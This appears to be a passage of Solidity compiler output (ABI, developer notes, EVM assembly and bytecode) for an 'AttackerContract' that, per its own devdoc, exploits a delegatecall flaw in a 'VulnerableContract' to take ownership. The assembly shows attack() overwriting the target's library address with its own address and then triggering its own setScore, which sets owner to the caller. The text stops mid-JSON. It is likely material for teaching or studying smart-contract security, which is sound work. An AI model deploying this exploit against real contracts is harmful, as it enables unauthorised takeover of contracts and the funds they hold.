{
	"VulnerableStateVariableContract.sol": {
		"AttackerContract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract VulnerableContract",
							"name": "_vulnerableContract",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "lib",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "score",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_score",
							"type": "uint256"
						}
					],
					"name": "setScore",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vulnerableContract",
					"outputs": [
						{
							"internalType": "contract VulnerableContract",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"details": "Used to exploit the delegatecall VulnerableContract has and use it to take ownership",
				"kind": "dev",
				"methods": {},
				"title": "AttackerContract",
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"VulnerableStateVariableContract.sol\":917:1934  contract AttackerContract {... */\n  mstore(0x40, 0x80)\n    /* \"VulnerableStateVariableContract.sol\":1210:1339  constructor(VulnerableContract _vulnerableContract) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"VulnerableStateVariableContract.sol\":1312:1331  _vulnerableContract */\n  dup1\n    /* \"VulnerableStateVariableContract.sol\":1272:1290  vulnerableContract */\n  0x03\n  0x00\n    /* \"VulnerableStateVariableContract.sol\":1272:1332  vulnerableContract = VulnerableContract(_vulnerableContract) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"VulnerableStateVariableContract.sol\":1210:1339  constructor(VulnerableContract _vulnerableContract) {... */\n  pop\n    /* \"VulnerableStateVariableContract.sol\":917:1934  contract AttackerContract {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:689   */\ntag_12:\n    /* \"#utility.yul\":630:637   */\n  0x00\n    /* \"#utility.yul\":659:683   */\n  tag_23\n    /* \"#utility.yul\":677:682   */\n  dup3\n    /* \"#utility.yul\":659:683   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":648:683   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:689   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":695:867   */\ntag_13:\n    /* \"#utility.yul\":793:842   */\n  tag_25\n    /* \"#utility.yul\":836:841   */\n  dup2\n    /* \"#utility.yul\":793:842   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":786:791   */\n  dup2\n    /* \"#utility.yul\":783:843   */\n  eq\n    /* \"#utility.yul\":773:861   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":857:858   */\n  0x00\n    /* \"#utility.yul\":854:855   */\n  dup1\n    /* \"#utility.yul\":847:859   */\n  revert\n    /* \"#utility.yul\":773:861   */\ntag_26:\n    /* \"#utility.yul\":695:867   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":873:1066   */\ntag_14:\n    /* \"#utility.yul\":955:960   */\n  0x00\n    /* \"#utility.yul\":986:992   */\n  dup2\n    /* \"#utility.yul\":980:993   */\n  mload\n    /* \"#utility.yul\":971:993   */\n  swap1\n  pop\n    /* \"#utility.yul\":1002:1060   */\n  tag_28\n    /* \"#utility.yul\":1054:1059   */\n  dup2\n    /* \"#utility.yul\":1002:1060   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":873:1066   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1072:1473   */\ntag_3:\n    /* \"#utility.yul\":1167:1173   */\n  0x00\n    /* \"#utility.yul\":1216:1218   */\n  0x20\n    /* \"#utility.yul\":1204:1213   */\n  dup3\n    /* \"#utility.yul\":1195:1202   */\n  dup5\n    /* \"#utility.yul\":1191:1214   */\n  sub\n    /* \"#utility.yul\":1187:1219   */\n  slt\n    /* \"#utility.yul\":1184:1303   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1222:1301   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1184:1303   */\ntag_30:\n    /* \"#utility.yul\":1342:1343   */\n  0x00\n    /* \"#utility.yul\":1367:1456   */\n  tag_32\n    /* \"#utility.yul\":1448:1455   */\n  dup5\n    /* \"#utility.yul\":1439:1445   */\n  dup3\n    /* \"#utility.yul\":1428:1437   */\n  dup6\n    /* \"#utility.yul\":1424:1446   */\n  add\n    /* \"#utility.yul\":1367:1456   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1357:1456   */\n  swap2\n  pop\n    /* \"#utility.yul\":1313:1466   */\n  pop\n    /* \"#utility.yul\":1072:1473   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"VulnerableStateVariableContract.sol\":917:1934  contract AttackerContract {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"VulnerableStateVariableContract.sol\":917:1934  contract AttackerContract {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x144166ae\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x422beeba\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x92801230\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xefedc669\n      eq\n      tag_8\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"VulnerableStateVariableContract.sol\":1159:1203  VulnerableContract public vulnerableContract */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"VulnerableStateVariableContract.sol\":1791:1932  function setScore(uint256 _score) public {... */\n    tag_4:\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      tag_16\n      jump\t// in\n    tag_13:\n      stop\n        /* \"VulnerableStateVariableContract.sol\":1109:1129  address public owner */\n    tag_5:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"VulnerableStateVariableContract.sol\":1085:1103  address public lib */\n    tag_6:\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"VulnerableStateVariableContract.sol\":1345:1711  function attack() public {... */\n    tag_7:\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      stop\n        /* \"VulnerableStateVariableContract.sol\":1135:1152  uint public score */\n    tag_8:\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"VulnerableStateVariableContract.sol\":1159:1203  VulnerableContract public vulnerableContract */\n    tag_10:\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"VulnerableStateVariableContract.sol\":1791:1932  function setScore(uint256 _score) public {... */\n    tag_16:\n        /* \"VulnerableStateVariableContract.sol\":1915:1925  msg.sender */\n      caller\n        /* \"VulnerableStateVariableContract.sol\":1907:1912  owner */\n      0x01\n      0x00\n        /* \"VulnerableStateVariableContract.sol\":1907:1925  owner = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"VulnerableStateVariableContract.sol\":1791:1932  function setScore(uint256 _score) public {... */\n      pop\n      jump\t// out\n        /* \"VulnerableStateVariableContract.sol\":1109:1129  address public owner */\n    tag_18:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"VulnerableStateVariableContract.sol\":1085:1103  address public lib */\n    tag_22:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"VulnerableStateVariableContract.sol\":1345:1711  function attack() public {... */\n    tag_25:\n        /* \"VulnerableStateVariableContract.sol\":1440:1458  vulnerableContract */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"VulnerableStateVariableContract.sol\":1440:1467  vulnerableContract.setScore */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x422beeba\n        /* \"VulnerableStateVariableContract.sol\":1492:1496  this */\n      address\n        /* \"VulnerableStateVariableContract.sol\":1468:1499  uint256(uint160(address(this))) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"VulnerableStateVariableContract.sol\":1440:1500  vulnerableContract.setScore(uint256(uint160(address(this)))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_32\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_32:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_33:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_35:\n      pop\n      pop\n      pop\n      pop\n        /* \"VulnerableStateVariableContract.sol\":1674:1692  vulnerableContract */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"VulnerableStateVariableContract.sol\":1674:1701  vulnerableContract.setScore */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x422beeba\n        /* \"VulnerableStateVariableContract.sol\":1702:1703  1 */\n      0x01\n        /* \"VulnerableStateVariableContract.sol\":1674:1704  vulnerableContract.setScore(1) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_36\n      swap2\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_38:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n        /* \"VulnerableStateVariableContract.sol\":1345:1711  function attack() public {... */\n      jump\t// out\n        /* \"VulnerableStateVariableContract.sol\":1135:1152  uint public score */\n    tag_27:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_41:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_42:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_43:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_63\n        /* \"#utility.yul\":306:340   */\n      tag_64\n        /* \"#utility.yul\":315:339   */\n      tag_65\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_41\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":306:340   */\n      tag_42\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":288:341   */\n      tag_41\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_44:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_67\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_43\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:636   */\n    tag_45:\n        /* \"#utility.yul\":560:569   */\n      0x00\n        /* \"#utility.yul\":593:630   */\n      tag_69\n        /* \"#utility.yul\":624:629   */\n      dup3\n        /* \"#utility.yul\":593:630   */\n      tag_44\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":580:630   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:636   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":642:823   */\n    tag_46:\n        /* \"#utility.yul\":754:816   */\n      tag_71\n        /* \"#utility.yul\":810:815   */\n      dup2\n        /* \"#utility.yul\":754:816   */\n      tag_45\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":749:752   */\n      dup3\n        /* \"#utility.yul\":742:817   */\n      mstore\n        /* \"#utility.yul\":642:823   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":829:1101   */\n    tag_12:\n        /* \"#utility.yul\":947:951   */\n      0x00\n        /* \"#utility.yul\":985:987   */\n      0x20\n        /* \"#utility.yul\":974:983   */\n      dup3\n        /* \"#utility.yul\":970:988   */\n      add\n        /* \"#utility.yul\":962:988   */\n      swap1\n      pop\n        /* \"#utility.yul\":998:1094   */\n      tag_73\n        /* \"#utility.yul\":1091:1092   */\n      0x00\n        /* \"#utility.yul\":1080:1089   */\n      dup4\n        /* \"#utility.yul\":1076:1093   */\n      add\n        /* \"#utility.yul\":1067:1073   */\n      dup5\n        /* \"#utility.yul\":998:1094   */\n      tag_46\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":829:1101   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1188:1305   */\n    tag_48:\n        /* \"#utility.yul\":1297:1298   */\n      0x00\n        /* \"#utility.yul\":1294:1295   */\n      dup1\n        /* \"#utility.yul\":1287:1299   */\n      revert\n        /* \"#utility.yul\":1434:1511   */\n    tag_50:\n        /* \"#utility.yul\":1471:1478   */\n      0x00\n        /* \"#utility.yul\":1500:1505   */\n      dup2\n        /* \"#utility.yul\":1489:1505   */\n      swap1\n      pop\n        /* \"#utility.yul\":1434:1511   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1517:1639   */\n    tag_51:\n        /* \"#utility.yul\":1590:1614   */\n      tag_79\n        /* \"#utility.yul\":1608:1613   */\n      dup2\n        /* \"#utility.yul\":1590:1614   */\n      tag_50\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":1583:1588   */\n      dup2\n        /* \"#utility.yul\":1580:1615   */\n      eq\n        /* \"#utility.yul\":1570:1633   */\n      tag_80\n      jumpi\n        /* \"#utility.yul\":1629:1630   */\n      0x00\n        /* \"#utility.yul\":1626:1627   */\n      dup1\n        /* \"#utility.yul\":1619:1631   */\n      revert\n        /* \"#utility.yul\":1570:1633   */\n    tag_80:\n        /* \"#utility.yul\":1517:1639   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1645:1784   */\n    tag_52:\n        /* \"#utility.yul\":1691:1696   */\n      0x00\n        /* \"#utility.yul\":1729:1735   */\n      dup2\n        /* \"#utility.yul\":1716:1736   */\n      calldataload\n        /* \"#utility.yul\":1707:1736   */\n      swap1\n      pop\n        /* \"#utility.yul\":1745:1778   */\n      tag_82\n        /* \"#utility.yul\":1772:1777   */\n      dup2\n        /* \"#utility.yul\":1745:1778   */\n      tag_51\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1645:1784   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1790:2119   */\n    tag_15:\n        /* \"#utility.yul\":1849:1855   */\n      0x00\n        /* \"#utility.yul\":1898:1900   */\n      0x20\n        /* \"#utility.yul\":1886:1895   */\n      dup3\n        /* \"#utility.yul\":1877:1884   */\n      dup5\n        /* \"#utility.yul\":1873:1896   */\n      sub\n        /* \"#utility.yul\":1869:1901   */\n      slt\n        /* \"#utility.yul\":1866:1985   */\n      iszero\n      tag_84\n      jumpi\n        /* \"#utility.yul\":1904:1983   */\n      tag_85\n      tag_48\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1866:1985   */\n    tag_84:\n        /* \"#utility.yul\":2024:2025   */\n      0x00\n        /* \"#utility.yul\":2049:2102   */\n      tag_86\n        /* \"#utility.yul\":2094:2101   */\n      dup5\n        /* \"#utility.yul\":2085:2091   */\n      dup3\n        /* \"#utility.yul\":2074:2083   */\n      dup6\n        /* \"#utility.yul\":2070:2092   */\n      add\n        /* \"#utility.yul\":2049:2102   */\n      tag_52\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2039:2102   */\n      swap2\n      pop\n        /* \"#utility.yul\":1995:2112   */\n      pop\n        /* \"#utility.yul\":1790:2119   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2125:2221   */\n    tag_53:\n        /* \"#utility.yul\":2162:2169   */\n      0x00\n        /* \"#utility.yul\":2191:2215   */\n      tag_88\n        /* \"#utility.yul\":2209:2214   */\n      dup3\n        /* \"#utility.yul\":2191:2215   */\n      tag_41\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2180:2215   */\n      swap1\n      pop\n        /* \"#utility.yul\":2125:2221   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2227:2345   */\n    tag_54:\n        /* \"#utility.yul\":2314:2338   */\n      tag_90\n        /* \"#utility.yul\":2332:2337   */\n      dup2\n        /* \"#utility.yul\":2314:2338   */\n      tag_53\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2309:2312   */\n      dup3\n        /* \"#utility.yul\":2302:2339   */\n      mstore\n        /* \"#utility.yul\":2227:2345   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2351:2573   */\n    tag_20:\n        /* \"#utility.yul\":2444:2448   */\n      0x00\n        /* \"#utility.yul\":2482:2484   */\n      0x20\n        /* \"#utility.yul\":2471:2480   */\n      dup3\n        /* \"#utility.yul\":2467:2485   */\n      add\n        /* \"#utility.yul\":2459:2485   */\n      swap1\n      pop\n        /* \"#utility.yul\":2495:2566   */\n      tag_92\n        /* \"#utility.yul\":2563:2564   */\n      0x00\n        /* \"#utility.yul\":2552:2561   */\n      dup4\n        /* \"#utility.yul\":2548:2565   */\n      add\n        /* \"#utility.yul\":2539:2545   */\n      dup5\n        /* \"#utility.yul\":2495:2566   */\n      tag_54\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2351:2573   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2579:2697   */\n    tag_55:\n        /* \"#utility.yul\":2666:2690   */\n      tag_94\n        /* \"#utility.yul\":2684:2689   */\n      dup2\n        /* \"#utility.yul\":2666:2690   */\n      tag_50\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":2661:2664   */\n      dup3\n        /* \"#utility.yul\":2654:2691   */\n      mstore\n        /* \"#utility.yul\":2579:2697   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2703:2925   */\n    tag_29:\n        /* \"#utility.yul\":2796:2800   */\n      0x00\n        /* \"#utility.yul\":2834:2836   */\n      0x20\n        /* \"#utility.yul\":2823:2832   */\n      dup3\n        /* \"#utility.yul\":2819:2837   */\n      add\n        /* \"#utility.yul\":2811:2837   */\n      swap1\n      pop\n        /* \"#utility.yul\":2847:2918   */\n      tag_96\n        /* \"#utility.yul\":2915:2916   */\n      0x00\n        /* \"#utility.yul\":2904:2913   */\n      dup4\n        /* \"#utility.yul\":2900:2917   */\n      add\n        /* \"#utility.yul\":2891:2897   */\n      dup5\n        /* \"#utility.yul\":2847:2918   */\n      tag_55\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2703:2925   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2931:3016   */\n    tag_56:\n        /* \"#utility.yul\":2976:2983   */\n      0x00\n        /* \"#utility.yul\":3005:3010   */\n      dup2\n        /* \"#utility.yul\":2994:3010   */\n      swap1\n      pop\n        /* \"#utility.yul\":2931:3016   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3022:3180   */\n    tag_57:\n        /* \"#utility.yul\":3080:3089   */\n      0x00\n        /* \"#utility.yul\":3113:3174   */\n      tag_99\n        /* \"#utility.yul\":3131:3173   */\n      tag_100\n        /* \"#utility.yul\":3140:3172   */\n      tag_101\n        /* \"#utility.yul\":3166:3171   */\n      dup5\n        /* \"#utility.yul\":3140:3172   */\n      tag_56\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":3131:3173   */\n      tag_42\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":3113:3174   */\n      tag_50\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3100:3174   */\n      swap1\n      pop\n        /* \"#utility.yul\":3022:3180   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3186:3333   */\n    tag_58:\n        /* \"#utility.yul\":3281:3326   */\n      tag_103\n        /* \"#utility.yul\":3320:3325   */\n      dup2\n        /* \"#utility.yul\":3281:3326   */\n      tag_57\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":3276:3279   */\n      dup3\n        /* \"#utility.yul\":3269:3327   */\n      mstore\n        /* \"#utility.yul\":3186:3333   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3339:3577   */\n    tag_37:\n        /* \"#utility.yul\":3440:3444   */\n      0x00\n        /* \"#utility.yul\":3478:3480   */\n      0x20\n        /* \"#utility.yul\":3467:3476   */\n      dup3\n        /* \"#utility.yul\":3463:3481   */\n      add\n        /* \"#utility.yul\":3455:3481   */\n      swap1\n      pop\n        /* \"#utility.yul\":3491:3570   */\n      tag_105\n        /* \"#utility.yul\":3567:3568   */\n      0x00\n        /* \"#utility.yul\":3556:3565   */\n      dup4\n        /* \"#utility.yul\":3552:3569   */\n      add\n        /* \"#utility.yul\":3543:3549   */\n      dup5\n        /* \"#utility.yul\":3491:3570   */\n      tag_58\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":3339:3577   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220741ea2437c84671a2f3c11d915d41b32e8d91d7e0e6448b4ae704edd1724ec3464736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50604051610610380380610610833981810160405281019061003291906100ee565b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061011b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a98261007e565b9050919050565b60006100bb8261009e565b9050919050565b6100cb816100b0565b81146100d657600080fd5b50565b6000815190506100e8816100c2565b92915050565b60006020828403121561010457610103610079565b5b6000610112848285016100d9565b91505092915050565b6104e68061012a6000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c8063144166ae14610067578063422beeba146100855780638da5cb5b146100a157806392801230146100bf5780639e5faafc146100dd578063efedc669146100e7575b600080fd5b61006f610105565b60405161007c9190610371565b60405180910390f35b61009f600480360381019061009a91906103c7565b61012b565b005b6100a961016f565b6040516100b69190610415565b60405180910390f35b6100c7610195565b6040516100d49190610415565b60405180910390f35b6100e56101b9565b005b6100ef6102ec565b6040516100fc919061043f565b60405180910390f35b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663422beeba3073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161022a919061043f565b600060405180830381600087803b15801561024457600080fd5b505af1158015610258573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663422beeba60016040518263ffffffff1660e01b81526004016102b89190610495565b600060405180830381600087803b1580156102d257600080fd5b505af11580156102e6573d6000803e3d6000fd5b50505050565b60025481565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061033761033261032d846102f2565b610312565b6102f2565b9050919050565b60006103498261031c565b9050919050565b600061035b8261033e565b9050919050565b61036b81610350565b82525050565b60006020820190506103866000830184610362565b92915050565b600080fd5b6000819050919050565b6103a481610391565b81146103af57600080fd5b50565b6000813590506103c18161039b565b92915050565b6000602082840312156103dd576103dc61038c565b5b60006103eb848285016103b2565b91505092915050565b60006103ff826102f2565b9050919050565b61040f816103f4565b82525050565b600060208201905061042a6000830184610406565b92915050565b61043981610391565b82525050565b60006020820190506104546000830184610430565b92915050565b6000819050919050565b600061047f61047a6104758461045a565b610312565b610391565b9050919050565b61048f81610464565b82525050565b60006020820190506104aa6000830184610486565b9291505056fea2646970667358221220741ea2437c84671a2f3c11d915d41b32e8d91d7e0e6448b4ae704edd1724ec3464736f6c63430008110033",
